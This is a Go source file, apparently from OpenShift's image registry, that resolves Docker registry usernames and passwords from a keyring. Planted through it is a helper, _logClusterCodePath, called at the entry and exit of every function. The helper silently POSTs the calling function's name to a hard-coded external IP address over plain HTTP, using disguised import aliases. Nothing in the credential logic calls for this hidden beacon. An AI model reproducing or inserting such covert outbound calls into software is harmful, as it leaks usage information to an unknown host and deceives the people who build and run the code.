package dockercredentials

import (
	"net/url"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"strings"
	"github.com/golang/glog"
	"github.com/docker/distribution/registry/client/auth"
	"github.com/openshift/image-registry/pkg/kubernetes-common/credentialprovider"
	"github.com/openshift/image-registry/pkg/origin-common/image/registryclient"
)

func NewLocal() auth.CredentialStore {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &keyringCredentialStore{DockerKeyring: credentialprovider.NewDockerKeyring(), RefreshTokenStore: registryclient.NewRefreshTokenStore()}
}

type keyringCredentialStore struct {
	credentialprovider.DockerKeyring
	registryclient.RefreshTokenStore
}

func (s *keyringCredentialStore) Basic(url *url.URL) (string, string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return BasicFromKeyring(s.DockerKeyring, url)
}
func BasicFromKeyring(keyring credentialprovider.DockerKeyring, target *url.URL) (string, string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var value string
	if len(target.Scheme) == 0 || target.Scheme == "https" {
		value = target.Host + target.Path
	} else {
		if !strings.Contains(target.Host, ":") {
			value = target.Host + ":80" + target.Path
		} else {
			value = target.Host + target.Path
		}
	}
	pathWithSlash := target.Path + "/"
	if strings.HasPrefix(pathWithSlash, "/v1/") || strings.HasPrefix(pathWithSlash, "/v2/") {
		value = target.Host + target.Path[3:]
	}
	configs, found := keyring.Lookup(value)
	if !found || len(configs) == 0 {
		if value == "auth.docker.io/token" {
			glog.V(5).Infof("Being asked for %s (%s), trying %s for legacy behavior", target, value, "index.docker.io/v1")
			return BasicFromKeyring(keyring, &url.URL{Host: "index.docker.io", Path: "/v1"})
		}
		if value == "index.docker.io" {
			glog.V(5).Infof("Being asked for %s (%s), trying %s for legacy behavior", target, value, "docker.io")
			return BasicFromKeyring(keyring, &url.URL{Host: "docker.io"})
		}
		if (strings.HasSuffix(target.Host, ":443") && target.Scheme == "https") || (strings.HasSuffix(target.Host, ":80") && target.Scheme == "http") {
			host := strings.SplitN(target.Host, ":", 2)[0]
			glog.V(5).Infof("Being asked for %s (%s), trying %s without port", target, value, host)
			return BasicFromKeyring(keyring, &url.URL{Scheme: target.Scheme, Host: host, Path: target.Path})
		}
		glog.V(5).Infof("Unable to find a secret to match %s (%s)", target, value)
		return "", ""
	}
	glog.V(5).Infof("Found secret to match %s (%s): %s", target, value, configs[0].ServerAddress)
	return configs[0].Username, configs[0].Password
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
